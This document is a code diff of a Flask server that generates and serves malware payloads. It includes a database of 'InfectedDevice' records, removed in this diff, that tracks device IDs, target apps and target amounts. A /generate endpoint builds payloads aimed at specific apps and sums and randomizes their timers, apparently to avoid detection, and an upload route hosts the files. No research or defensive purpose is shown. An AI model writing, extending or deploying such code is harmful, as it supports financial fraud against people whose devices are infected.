@@ -1,26 +1,15 @@
 from flask import Flask, request, jsonify, render_template
-from flask_sqlalchemy import SQLAlchemy
 from flask_cors import CORS
 import uuid
 import os
 import random
 
 app = Flask(__name__)
-app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL') or 'postgresql://user:password@localhost/malware'
 app.config['UPLOAD_FOLDER'] = '/tmp/uploads'
 os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
 
 # Enable CORS
 CORS(app)
-
-db = SQLAlchemy(app)
-
-class InfectedDevice(db.Model):
-    id = db.Column(db.Integer, primary_key=True)
-    device_id = db.Column(db.String(120), unique=True)
-    target_app = db.Column(db.String(120))
-    target_amount = db.Column(db.Float)
-    timestamp = db.Column(db.DateTime, default=db.func.current_timestamp())
 
 def generate_enhanced_payload(device_id, target_app, target_amount):
     selectors = [
@@ -67,23 +56,16 @@ def home():
 
 @app.route('/generate', methods=['POST'])
 def generate():
-    try:
-        device_id = request.json.get('device_id')
-        target_app = request.json.get('target_app')
-        target_amount = request.json.get('target_amount')
-        
-        malware = InfectedDevice(device_id=device_id, target_app=target_app, target_amount=target_amount)
-        db.session.add(malware)
-        db.session.commit()
-        
-        payload = generate_enhanced_payload(device_id, target_app, target_amount)
-        delay = random.randint(1000, 5000)
-        payload = payload.replace('setInterval(', f'setTimeout(() => setInterval(')
-        payload = payload.replace('), 500)', f'), {delay})')
-        
-        return jsonify({'payload': payload})
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
+    device_id = request.json.get('device_id')
+    target_app = request.json.get('target_app')
+    target_amount = request.json.get('target_amount')
+    
+    payload = generate_enhanced_payload(device_id, target_app, target_amount)
+    delay = random.randint(1000, 5000)
+    payload = payload.replace('setInterval(', f'setTimeout(() => setInterval(')
+    payload = payload.replace('), 500)', f'), {delay})')
+    
+    return jsonify({'payload': payload})
 
 @app.route('/upload', methods=['POST'])
 def upload():
@@ -100,14 +82,5 @@ def upload():
     
     return jsonify({'url': f"{request.url_root}uploads/{filename}"})
 
-@app.before_first_request
-def create_tables():
-    try:
-        db.create_all()
-    except Exception as e:
-        print(f"Error creating tables: {e}")
-        db.session.rollback()
-
 if __name__ == '__main__':
-    db.create_all()
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
